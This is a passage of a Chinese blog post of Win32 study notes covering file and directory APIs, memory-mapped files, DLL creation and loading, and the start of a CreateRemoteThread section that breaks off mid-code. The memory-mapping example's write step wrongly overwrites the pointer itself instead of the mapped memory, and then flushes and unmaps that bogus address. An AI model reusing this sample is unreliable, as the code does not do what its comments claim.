name 目录名称，需要指定完整路径包含盘符的</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="修改目录名称">修改目录名称</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">MoveFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpExistingFileName, <span class="comment">// file name 目录名</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpNewFileName       <span class="comment">// new file name 新目录名</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="获取程序当前目录">获取程序当前目录</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">GetCurrentDirectory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD nBufferLength,  <span class="comment">// size of directory buffer 输入类型，获取当前目录名的大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPTSTR lpBuffer       <span class="comment">// directory buffer 输出类型，当前目录名称</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="设置程序当前目录">设置程序当前目录</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetCurrentDirectory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpPathName   <span class="comment">// new directory name 新的目录名称</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="文件相关api">文件相关API</h2><h2 id="创建文件">创建文件</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpFileName,                         <span class="comment">// file name 文件名</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwDesiredAccess,                      <span class="comment">// access mode 访问模式</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwShareMode,                          <span class="comment">// share mode 共享模式，如果为0则是排他性，就是目前在使用时其他人是无法使用的</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpSecurityAttributes, <span class="comment">// SD 安全属性，包含安全描述符</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwCreationDisposition,                <span class="comment">// how to create 如何创建，可以打开一个已经存在的文件</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwFlagsAndAttributes,                 <span class="comment">// file attributes 文件属性，可以创建隐藏文件</span></span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hTemplateFile                        <span class="comment">// handle to template file </span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>以可读可写方式不管有没有，有就覆盖没有就新建的方式创建一个隐藏文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateFile</span>(</span><br><span class="line">        <span class="built_in">TEXT</span>(<span class="string">&quot;E:\\A.txt&quot;</span>),</span><br><span class="line">        GENERIC_READ | GENERIC_WRITE,<span class="comment">//访问模式</span></span><br><span class="line">        <span class="number">0</span>,                     <span class="comment">//共享模式，如果为0则是排他性，就是目前在使用时其他人是无法使用的</span></span><br><span class="line">        <span class="literal">NULL</span>,                  <span class="comment">// SD</span></span><br><span class="line">        CREATE_ALWAYS,         <span class="comment">//如何创建，可以打开一个已经存在的文件</span></span><br><span class="line">        FILE_ATTRIBUTE_HIDDEN, <span class="comment">//文件属性，可以创建隐藏文件</span></span><br><span class="line">        <span class="literal">NULL</span>                   <span class="comment">//创建文件的句柄</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure><h2 id="关闭文件">关闭文件</h2><p>未完成..................待续..............</p><h1 id="内存映射文件">内存映射文件</h1><p>内存映射文件，将硬盘某个文件映射到<strong>物理页</strong>上，然后再将物理页映射到<strong>虚拟内存</strong>中。</p><h2 id="内存映射文件读写">内存映射文件读写</h2><ol type="1"><li>创建文件</li><li>创建FileMapping对象</li><li>物理页映射到虚拟内存</li><li>之后就是读写文件了</li><li>关闭资源</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hFile;</span><br><span class="line">    HANDLE hMapFile;</span><br><span class="line">    LPVOID lpAddr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 创建文件（获取文件句柄）</span></span><br><span class="line">    hFile = <span class="built_in">CreateFile</span>(</span><br><span class="line">        <span class="built_in">TEXT</span>(<span class="string">&quot;E:\\1.txt&quot;</span>), </span><br><span class="line">        GENERIC_READ | GENERIC_WRITE, </span><br><span class="line">        <span class="number">0</span>, </span><br><span class="line">        <span class="literal">NULL</span>, </span><br><span class="line">        OPEN_EXISTING, </span><br><span class="line">        FILE_ATTRIBUTE_NORMAL, </span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断CreateFile是否执行成功</span></span><br><span class="line">    <span class="keyword">if</span> (hFile == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateFile failed: %d \n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 创建FileMapping对象</span></span><br><span class="line">    hMapFile = <span class="built_in">CreateFileMapping</span>(</span><br><span class="line">        hFile, <span class="literal">NULL</span>, PAGE_READWRITE, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断CreateFileMapping是否执行成功</span></span><br><span class="line">    <span class="keyword">if</span> (hMapFile == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateFileMapping failed: %d \n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 物理页映射到虚拟内存</span></span><br><span class="line">    lpAddr = <span class="built_in">MapViewOfFile</span>(hMapFile, FILE_MAP_COPY, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 读取文件</span></span><br><span class="line">    DWORD dwTest1 = *(LPDWORD)lpAddr; <span class="comment">// 读取最开始的4字节</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dwTest1: %x \n&quot;</span>, dwTest1);</span><br><span class="line">    <span class="comment">// 5. 写文件 </span></span><br><span class="line">     lpAddr = (LPVOID)<span class="number">0x11111111</span>;</span><br><span class="line">   <span class="comment">// 如果你希望修改可以立即生效，我们可以通过FlushViewOfFile函数来强制更新缓存</span></span><br><span class="line">     <span class="built_in">FlushViewOfFile</span>(((LPDWORD)lpAddr), <span class="number">8</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    <span class="comment">// 6. 关闭资源</span></span><br><span class="line">    <span class="built_in">UnmapViewOfFile</span>(lpAddr);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hMapFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内存映射文件之共享">内存映射文件之共享</h2><p>实现如下的情况</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404232317050.png" alt="image-20220404232317050"><figcaption aria-hidden="true">image-20220404232317050</figcaption></figure><p>A程序写入，B程序读取：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAPPINGNAME <span class="meta-string">&quot;Share File&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function">DWORD <span class="title">MappingFile</span><span class="params">(LPSTR lpcFile)</span> </span>&#123;</span><br><span class="line">    HANDLE hFile;</span><br><span class="line">    HANDLE hMapFile;</span><br><span class="line">    LPVOID lpAddr;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1. 创建文件（获取文件句柄）</span></span><br><span class="line">    hFile = <span class="built_in">CreateFile</span>(lpcFile, GENERIC_READ|GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 判断CreateFile是否执行成功</span></span><br><span class="line">    <span class="keyword">if</span>(hFile == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateFile failed: %d \n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. 创建FileMapping对象</span></span><br><span class="line">    hMapFile = <span class="built_in">CreateFileMapping</span>(hFile, <span class="literal">NULL</span>, PAGE_READWRITE, <span class="number">0</span>, <span class="number">0</span>, MAPPINGNAME);</span><br><span class="line">        </span><br><span class="line">    <span class="comment">// 判断CreateFileMapping是否执行成功</span></span><br><span class="line">    <span class="keyword">if</span>(hMapFile == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateFileMapping failed: %d \n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 3. 物理页映射到虚拟内存</span></span><br><span class="line">    lpAddr = <span class="built_in">MapViewOfFile</span>(hMapFile, FILE_MAP_ALL_ACCESS, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 4. 读取文件</span></span><br><span class="line">    <span class="comment">// DWORD dwTest1 = *(LPDWORD)lpAddr; // 读取最开始的4字节</span></span><br><span class="line">    <span class="comment">// printf(&quot;dwTest1: %x \n&quot;, dwTest1);</span></span><br><span class="line">    <span class="comment">// 5. 写文件</span></span><br><span class="line">    *(LPDWORD)lpAddr = <span class="number">0x41414142</span>;</span><br><span class="line">    <span class="built_in">FlushViewOfFile</span>(((LPDWORD)lpAddr), <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Process A Write&quot;</span>);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="comment">// 6. 关闭资源</span></span><br><span class="line">    <span class="built_in">UnmapViewOfFile</span>(lpAddr);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hMapFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>B程序：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAPPINGNAME <span class="meta-string">&quot;Share File&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function">DWORD <span class="title">MappingFile</span><span class="params">(LPSTR lpcFile)</span> </span>&#123;</span><br><span class="line">    HANDLE hMapFile;</span><br><span class="line">    LPVOID lpAddr;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1. 打开FileMapping对象</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    OpenFileMapping 函数语法格式：</span></span><br><span class="line"><span class="comment">    HANDLE OpenFileMapping(</span></span><br><span class="line"><span class="comment">        DWORD dwDesiredAccess,  // access mode 访问模式</span></span><br><span class="line"><span class="comment">        BOOL bInheritHandle,    // inherit flag 继承标识，为真则表示这个可以被新进程继承，为假反之</span></span><br><span class="line"><span class="comment">        LPCTSTR lpName          // object name 对象名称</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    hMapFile = <span class="built_in">OpenFileMapping</span>(FILE_MAP_ALL_ACCESS, FALSE, MAPPINGNAME);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 2. 物理页映射到虚拟内存</span></span><br><span class="line">    lpAddr = <span class="built_in">MapViewOfFile</span>(hMapFile, FILE_MAP_ALL_ACCESS, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 3. 读取文件</span></span><br><span class="line">    DWORD dwTest1 = *(LPDWORD)lpAddr; <span class="comment">// 读取最开始的4字节</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dwTest1: %x \n&quot;</span>, dwTest1);</span><br><span class="line">    <span class="comment">// 4. 写文件</span></span><br><span class="line">    <span class="comment">// *(LPDWORD)lpAddr = 0x41414142;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Process B Read&quot;</span>);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="comment">// 5. 关闭资源</span></span><br><span class="line">    <span class="built_in">UnmapViewOfFile</span>(lpAddr);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hMapFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内存映射文件之写拷贝">内存映射文件之写拷贝</h2><p>实际上我们程序调用的user32.dll这类dll文件，也是通过这种方式进行调用的，如果我们进程A修改了某个DLL，就会导致进程B出问题。</p><p>为了解决这种隐患，我们可以使用写拷贝的方式来处理。</p><p>写拷贝的实现就是<strong>MapViewOfFile函数</strong>中的第二个参数值为<strong>FILE_MAP_COPY</strong>，<strong>它的意思表示当你在写的时候进行拷贝</strong>。写拷贝属性时候，写入时并<strong>不会影响</strong>原本的文件内容</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404235855922.png" alt="image-20220404235855922"><figcaption aria-hidden="true">image-20220404235855922</figcaption></figure><h1 id="静态链接库">静态链接库</h1><p>动态链接和静态链接之前pwn的时候搞过，就不写的太详细了。</p><p>写好之后，将生成的.h文件和.lib文件放到项目的根目录，然后引用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;xxxx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;xxxx.lib&quot;</span>)</span></span><br></pre></td></tr></table></figure><h1 id="动态链接库">动态链接库</h1><p>使用的是VS2022,，创建动态链接库项目，把其他的文件删掉，新建MyDLL的h和cpp文件，不使用预编译头。</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220405004843503.png" alt="image-20220405004843503"><figcaption aria-hidden="true">image-20220405004843503</figcaption></figure><p>.h:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)  <span class="function"><span class="keyword">int</span> <span class="title">ADD</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)  <span class="function"><span class="keyword">int</span> <span class="title">SUB</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br></pre></td></tr></table></figure><p>.cpp:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ADD</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SUB</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成：</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220405005507193.png" alt="image-20220405005507193"><figcaption aria-hidden="true">image-20220405005507193</figcaption></figure><p>使用：</p><p>生成的dll，将dll，lib和h文件放到使用dll的项目中，vcxproj同级。</p><p>之后分别右键导入h和lib、dll，直接使用就可：</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220405013109265.png" alt="image-20220405013109265"><figcaption aria-hidden="true">image-20220405013109265</figcaption></figure><p>还可以这样使用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将DLL文件复制到项目目录下</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// 步骤1：定义函数指针,如：</span></span><br><span class="line">   <span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*lpAdd)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 步骤2：声明函数指针变量,如：</span></span><br><span class="line">   lpAdd myAdd;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 步骤3：动态加载dll到内存中,如：</span></span><br><span class="line">   <span class="comment">// LoadLibrary函数会先从当前目录寻找，然后在系统目录寻找</span></span><br><span class="line">   HINSTANCE hModule = <span class="built_in">LoadLibrary</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;MyDLL.dll&quot;</span>));</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 步骤4：获取函数地址,如：</span></span><br><span class="line">   myAdd = (lpAdd)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;ADD&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 步骤5：调用函数,如：</span></span><br><span class="line">   <span class="keyword">int</span> a = <span class="built_in">myAdd</span>(<span class="number">10</span>, <span class="number">2</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 步骤6：释放动态链接库,如：</span></span><br><span class="line">   <span class="built_in">FreeLibrary</span>(hModule);</span><br></pre></td></tr></table></figure><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220405111423572.png" alt="image-20220405111423572"><figcaption aria-hidden="true">image-20220405111423572</figcaption></figure><h1 id="隐式链接">隐式链接</h1><p>将动态链接生成的lib和dll文件放到项目目录 ，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;MyDLL.lib&quot;</span>)</span></span><br><span class="line">__declspec(dllimport) <span class="function"><span class="keyword">int</span> <span class="title">ADD</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line">__declspec(dllimport) <span class="function"><span class="keyword">int</span> <span class="title">SUB</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="built_in">SUB</span>(<span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> b = <span class="built_in">ADD</span>(<span class="number">23</span>, <span class="number">11</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="dllmain">DLLMain</h2><p>dll的入口函数是DLLMain，DLLMain可能执行很多次</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HINSTANCE hinstDLL,   <span class="comment">// handle to the DLL module DLL模块的句柄，当前DLL被加载到什么位置</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD fdwReason,      <span class="comment">// reason for calling function DLL被调用的原因，有4种情况：DLL_PROCESS_ATTACH（当某个进程第一次执行LoadLibrary）、DLL_PROCESS_DETACH（当某个进程释放了DLL）、DLL_THREAD_ATTACH（当某个进程的其他线程再次执行LoadLibrary）、DLL_THREAD_DETACH（当某个进程的其他线程释放了DLL）</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID lpvReserved    <span class="comment">// reserved</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h1 id="远程线程">远程线程</h1><h2 id="createremotethread">CreateRemoteThread</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hProcess,                          <span class="comment">// handle to process 输入类型，进程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// SD 输入类型，安全属性，包含安全描述符</span></span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T dwStackSize,                       <span class="comment">// initial stack size 输入类型，堆大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPTHREAD_START_ROUTINE lpStartAddress,    <span class="comment">// thread function 输入类型，线程函数，线程函数地址应该是在别的进程中存在的</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID lpParameter,                       <span class="comment">// thread argument　输入类型，线程参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwCreationFlags,                    <span class="comment">// creation option 输入类型，创建设置</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPDWORD lpThreadId                        <span class="comment">// thread identifier 输出类型，线程id</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>CreateThread</strong>函数是在当前进程中创建线程，而<strong>CreateRemoteThread</strong>函数是允许在其他进程中创建线程，所以<strong>远程线程就可以理解为是非本进程中的线程</strong>。</p><p>A进程简单的输出10句话，之后使用B进程创建远程进程</p><p>A:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Fun</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fun running... \n&quot;</span>);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">Fun</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span 